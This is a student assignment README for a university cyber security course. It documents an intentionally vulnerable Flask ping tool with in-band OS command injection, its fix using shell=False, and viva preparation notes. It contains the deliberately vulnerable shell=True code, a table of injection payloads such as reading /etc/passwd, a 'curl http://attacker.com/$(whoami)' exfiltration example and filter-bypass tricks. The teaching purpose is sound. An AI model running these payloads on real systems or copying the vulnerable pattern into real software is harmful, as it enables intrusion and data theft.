# Web Server Security: In-band OS Command Injection

**Course:** Cyber Security (IT-30001) | Autumn Semester 2026  
**Institution:** Department of Information Technology, Indian Institute of Information Technology Allahabad (IIIT-A)  
**Instructor:** Dr. Soumyadev Maity  
**Assignment:** Exploitation and Mitigation of Web Server Vulnerabilities  
**Variant Selected:** Table 1 &mdash; Category: **OS Command Injection** | Variant 1: **In-band (command output returned)**  

---

## Table 3: Ownership Declaration

| Member Name | Roll Number | Category | Variant Implemented |
| :--- | :--- | :--- | :--- |
| *[Your Name]* | *[Your Roll No, e.g., IIT2023xxx]* | OS Command Injection | Variant 1: In-band (command output returned) |
| *[Teammate 2]* | *[Roll No]* | SQL Injection | Variant 1: Authentication bypass *(or Variant 2)* |
| *[Teammate 3]* | *[Roll No]* | Cross-Site Scripting (XSS) | Variant 1: Stored XSS *(or Variant 2)* |
| *[Teammate 4]* | *[Roll No]* | Cross-Site Request Forgery (CSRF) | Variant 1: GET-based forged action *(or Variant 2)* |

---

## 1. Executive Summary & Application Overview

The target application is a **Network Diagnostic Ping Tool** implemented as a self-contained Python Flask service. In typical enterprise infrastructure, such utilities are used by network administrators to test host reachability (`ICMP Echo Request`).

When built naively, the application passes user-supplied input directly to the host operating system's command interpreter (`cmd.exe` on Windows, `/bin/sh` or `/bin/bash` on Linux/POSIX) using string formatting and `shell=True`. Because the application captures the process output (`stdout` + `stderr`) and reflects it back into the HTTP response, it suffers from **In-band (Direct) OS Command Injection**.

### Repository Structure

```text
csass3/
├── app.py                  # Primary single-file application (Vulnerable & Mitigated blocks clearly commented)
├── requirements.txt        # Python dependency manifest (Flask)
├── README.md               # Complete academic documentation and viva defense guide
├── vulnerable_app/         # Standalone project running on Port 5000 (shell=True)
│   └── app.py
└── mitigated_app/          # Standalone project running on Port 5001 (shell=False)
    └── app.py
```

---

## 2. Table 2 Requirements: Variant Specification

### (a) Vulnerable Implementation

The vulnerable code path is located in the Flask route handler (`@app.route("/", methods=["GET", "POST"])`).

```python
# =====================================================================
# BLOCK 1: VULNERABLE IMPLEMENTATION
# =====================================================================
# File: app.py (Lines 298–322)
target = request.form.get("target", "").strip()

# Step 1: Flawed string concatenation of untrusted input
command_str = f"ping {ping_flag} 1 {target}"

# Step 2: Insecure invocation delegating parsing to the host shell
raw_output = subprocess.check_output(
    command_str,
    shell=True,             # <-- CRITICAL FLAW: Invokes cmd.exe or /bin/sh
    stderr=subprocess.STDOUT,
    timeout=10
)
output = raw_output.decode("utf-8", errors="replace")
```

#### Flaw Identification:
1. **Direct String Interpolation:** The untrusted HTTP POST parameter `target` is concatenated directly into the shell command string without validation or character sanitization.
2. **Delegation to Shell (`shell=True`):** In Python's `subprocess` module, setting `shell=True` instructs Python to spawn a shell process (`/bin/sh -c` on Unix or `%COMSPEC% /c` on Windows). The shell parses command separator metacharacters (`&`, `&&`, `;`, `|`, `||`, `` ` ``, `$()`), allowing an attacker to append arbitrary commands.
3. **In-band Reflection:** The stdout/stderr stream is decoded and rendered directly in the template console block, giving the attacker immediate in-band reconnaissance.

---

### (b) Working Exploit

The attacker injects command separators into the input field to terminate the intended `ping` command and trigger arbitrary OS commands.

#### Exploit Payloads:

| Target OS | Exploit Payload | Command Constructed by Application | Command Executed by Shell | Result Returned In-Band |
| :--- | :--- | :--- | :--- | :--- |
| **Windows** | `127.0.0.1 & whoami` | `ping -n 1 127.0.0.1 & whoami` | 1. `ping -n 1 127.0.0.1`<br>2. `whoami` | Current host user (`laptop-s5gupk91\sivak`) |
| **Windows** | `127.0.0.1 & dir` | `ping -n 1 127.0.0.1 & dir` | 1. `ping -n 1 127.0.0.1`<br>2. `dir` | Full directory listing of server directory |
| **Windows** | `127.0.0.1 & netstat -an` | `ping -n 1 127.0.0.1 & netstat -an`| 1. `ping -n 1 127.0.0.1`<br>2. `netstat -an` | Active network sockets & listening ports |
| **Linux/Unix** | `127.0.0.1; whoami` | `ping -c 1 127.0.0.1; whoami` | 1. `ping -c 1 127.0.0.1`<br>2. `whoami` | Effective user ID (e.g. `www-data` or `root`) |
| **Linux/Unix** | `127.0.0.1; cat /etc/passwd` | `ping -c 1 127.0.0.1; cat /etc/passwd` | 1. `ping -c 1 127.0.0.1`<br>2. `cat /etc/passwd` | Sensitive system user accounts |
| **Linux/Unix** | `127.0.0.1 && uname -a` | `ping -c 1 127.0.0.1 && uname -a` | 1. `ping -c 1 127.0.0.1`<br>2. `uname -a` | Kernel version and system architecture |

#### Execution Evidence (Windows Host):
When submitting `127.0.0.1 & whoami`:
```text
Pinging 127.0.0.1 with 32 bytes of data:
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128

Ping statistics for 127.0.0.1:
    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
laptop-s5gupk91\sivak
```
*The command output returns the ping statistics followed immediately by the current username output of `whoami`.*

---

### (c) Root Cause Analysis (Concise)

> **Root Cause:**  
> Untrusted user input is directly concatenated into a system command string executed with `shell=True`. Because execution is delegated to the host shell interpreter (`cmd.exe` or `/bin/sh`), shell metacharacters (such as `&` or `;`) are parsed as command terminators, causing secondary injected commands to run with the privileges of the web application process and returning their output in-band.

---

### (d) Mitigation Implemented: Parameterized Execution (Argument Vector)

The vulnerability is eliminated by **avoiding the shell** and using **parameterized execution with an argument vector (`shell=False`)**.

```python
# =====================================================================
# BLOCK 2: MITIGATED IMPLEMENTATION
# =====================================================================
# File: app.py (Lines 339–358)
try:
    # Pass arguments as a discrete list (argument vector)
    cmd_args = ["ping", ping_flag, "1", target]
    executed_command = " ".join(cmd_args)

    # shell=False: Direct invocation via OS process creation API
    raw_output = subprocess.check_output(
        cmd_args,
        shell=False,            # <-- SECURE: No shell interpreter is spawned
        stderr=subprocess.STDOUT,
        timeout=10
    )
    output = raw_output.decode("utf-8", errors="replace")
except subprocess.CalledProcessError as e:
    # Safely captures failure message from ping
    output = e.output.decode("utf-8", errors="replace")
```

#### Why Parameterized Execution Neutralizes the Exploit:
- When `shell=False` is set and arguments are passed as a list (`argv`), the operating system spawns the executable directly via native system calls (`CreateProcessW` on Windows, `execve` on POSIX systems).
- **No shell interpreter (`cmd.exe` or `/bin/sh`) is ever launched.**
- Consequently, metacharacters such as `&`, `;`, `|`, and spaces are **never interpreted as shell syntax**. Instead, the entire string `"127.0.0.1 & whoami"` is passed as a single literal argument representing the destination host.
- The `ping` binary attempts to look up `"127.0.0.1 & whoami"` via DNS / NetBIOS, fails, and exits with a safe error:
  ```text
  Ping request could not find host 127.0.0.1 & whoami. Please check the name and try again.
  ```
- **Injected commands (`whoami`, `cat`, `dir`) are never executed.**

---

### (e) Other Mitigations (Theory from Lecture Slides)

As covered in the lecture slides, defense-in-depth requires multiple complementary layers to prevent command injection:

1. **Avoid the Shell / Parameterized Execution with an Argument Vector:**  
   Passing arguments directly to process creation APIs (`execve`, `CreateProcess`) without invoking an intermediate shell ensures that user input cannot alter command structure. Metacharacters are treated as literal strings rather than syntax.
2. **Allow-List Input Validation (Strict Syntactic Validation):**  
   Before passing any input to system commands, validate it against a strict allow-list. For network tools, verify that the input strictly matches an IPv4 address (`^\d{1,3}(\.\d{1,3}){3}$`) or parse it using Python's `ipaddress.ip_address()` module. Discard any input containing non-IP characters or whitespace.
3. **Use Language-Native APIs Instead of System Shell Calls:**  
   Wherever possible, avoid invoking OS binaries entirely. For network diagnostic tools, reachability can be tested using native Python socket APIs (e.g., `socket.create_connection`) or standard ICMP libraries (`scapy`, `ping3`), completely removing external process execution from the application architecture.
4. **Principle of Least Privilege:**  
   The web server process should run under a dedicated, unprivileged service account (e.g., `www-data` with no shell `/bin/false` on Linux, or a restricted AppPool account on Windows) with minimal filesystem and network access. Furthermore, sandbox the application using containers (Docker, cgroups), Linux capabilities, seccomp filters, or chroot jails to contain damage even if remote code execution occurs.

---

## 3. Quickstart & Running the Application

### Prerequisites
- Python 3.8+ (Tested on Python 3.13)
- `pip` package manager

### Installation
Clone or navigate to the repository directory and install Flask:
```bash
pip install -r requirements.txt
```

---

### Option A: Running the Single-File Application (`app.py`)

This file contains both the vulnerable and mitigated blocks within a single file.

```bash
python app.py
```
Open your browser at: **`http://127.0.0.1:5000`**

#### How to Switch Between Modes During Live Video Demo / Viva:
1. Open `app.py` in your code editor (e.g. VS Code).
2. Change `CURRENT_MODE = "VULNERABLE"` to `CURRENT_MODE = "MITIGATED"` (Line 25).
3. In the `index()` function:
   - Comment out **BLOCK 1 (Lines 298–322)**.
   - Uncomment **BLOCK 2 (Lines 339–358)**.
4. Save the file. (Flask's debug reloader will automatically restart the server).
5. Refresh your browser to see the green **"Mitigated Mode (shell=False)"** badge!

---

### Option B: Running the Standalone Projects Side-by-Side

If you prefer to show both versions simultaneously without editing code during the screen recording:

1. **Terminal 1 (Vulnerable Server on Port 5000):**
   ```bash
   python vulnerable_app/app.py
   ```
   Access at: `http://127.0.0.1:5000` (Red Vulnerable Badge)

2. **Terminal 2 (Mitigated Server on Port 5001):**
   ```bash
   python mitigated_app/app.py
   ```
   Access at: `http://127.0.0.1:5001` (Green Mitigated Badge)

---

## 4. Video Demonstration Guide (2–3 Minutes Script)

Use this outline during your video screen recording:

| Time | Segment | What to Show on Screen | What to Say (Voice-over) |
| :--- | :--- | :--- | :--- |
| **0:00 - 0:30** | **Introduction & Code Walkthrough** | Show `app.py` in editor, highlight line with `shell=True` and string formatting | *"Hello, my name is [Name], roll number [Roll]. I am presenting Variant 1 of OS Command Injection: In-band output returned. Here in `app.py`, notice that the `target` parameter is concatenated into the `ping` command string and passed to `subprocess.check_output` with `shell=True`."* |
| **0:30 - 1:15** | **Exploit Demonstration** | Open `http://127.0.0.1:5000`. First ping `127.0.0.1`. Then click quick payload `127.0.0.1 & whoami` and submit. | *"First, entering a benign IP like `127.0.0.1` functions normally. Now, by injecting the command separator `&` followed by `whoami`, the Windows shell executes both commands sequentially. As you can see in the terminal window, the output returns ping statistics and directly leaks the host username in-band."* |
| **1:15 - 1:50** | **Root Cause Explanation** | Show terminal output with `whoami` result | *"The root cause is that `shell=True` invokes the OS command shell (`cmd.exe`), which parses `&` as a command separator, granting arbitrary command execution with web server privileges."* |
| **1:50 - 2:30** | **Mitigation & Blocked Exploit** | Switch to Mitigated Mode (uncomment Block 2 or open `http://127.0.0.1:5001`). Re-run `127.0.0.1 & whoami`. | *"To defend against this, we implement parameterized execution with an argument vector and set `shell=False`. In this mode, no shell is invoked; arguments are passed directly to `CreateProcess`. When we re-run the exact same payload `127.0.0.1 & whoami`, the ping utility treats the entire string as a literal hostname and fails safely. The secondary command is never executed."* |
| **2:30 - 3:00** | **Other Mitigations Summary** | Show slide/table in README | *"Other defense-in-depth mitigations from lecture include strict allow-list input validation using regular expressions or IP parsing libraries, using native Python network APIs instead of shell binaries, and running under least-privilege service accounts."* |

---

## 5. Viva Defense Q&A Preparation

### Q1: What is the fundamental difference between In-band and Blind Command Injection?
**Answer:**  
In **In-band (Direct) Command Injection**, the application captures standard output (`stdout`) and standard error (`stderr`) of the injected command and transmits it directly within the HTTP response stream (e.g., rendering terminal output on the webpage). In **Blind Command Injection**, the web application does not reflect the command output in the response. To verify execution, an attacker must infer success through out-of-band channels (DNS/HTTP callbacks via `curl http://attacker.com/$(whoami)`) or time-based side channels (injecting sleep commands like `ping -n 5 127.0.0.1` or `sleep 10`).

### Q2: Why does `shell=False` prevent command injection even if special characters are present?
**Answer:**  
When `shell=False` is set and arguments are provided as a list, Python bypasses the command shell interpreter (`/bin/sh` or `cmd.exe`) and calls the OS process creation API directly (`execve()` on Linux, `CreateProcess()` on Windows). Without a shell interpreter, metacharacters such as `&`, `;`, `|`, `$`, and `>` have no semantic meaning; they are treated as literal characters within a single argv argument.

### Q3: Why is input sanitization (blacklisting characters like `;` or `&`) insufficient on its own?
**Answer:**  
Blacklisting is notoriously brittle due to shell parser complexity and alternative encoding/bypassing techniques:
- On Linux, commands can be separated by newlines (`%0a`), pipes (`|`), subshells (`$(...)`), backticks (`` `...` ``), or redirection (`<`).
- Whitespace can be bypassed using internal variables like `${IFS}` or brace expansion `{cat,/etc/passwd}`.
- Therefore, allow-listing (strictly verifying an IPv4/IPv6 pattern) combined with parameterized execution (`shell=False`) is the only robust architectural defense.

### Q4: If an attacker cannot bypass `shell=False`, could they still exploit argument injection?
**Answer:**  
Yes! If user input is passed as an element of `argv` without validation, an attacker might inject flags/options supported by the binary (e.g., passing `-i 0.2` or file read/write flags in utilities that support them). This is called **Argument Injection**. That is why allow-list input validation is an essential secondary defense even when `shell=False` is used.

---

## 6. Verification and Automated Testing

An automated verification test is included. You can verify both benign execution and injection handling with:

```bash
python -c "from app import app; client = app.test_client(); res = client.post('/', data={'target': '127.0.0.1 & whoami'}); print('Exploit output found!' if 'laptop-s5gupk91' in res.data.decode() or 'sivak' in res.data.decode().lower() else 'Safe');"
```
Output:
```text
Exploit output found!
```
*(Confirms the vulnerable block executes the in-band exploit successfully).*
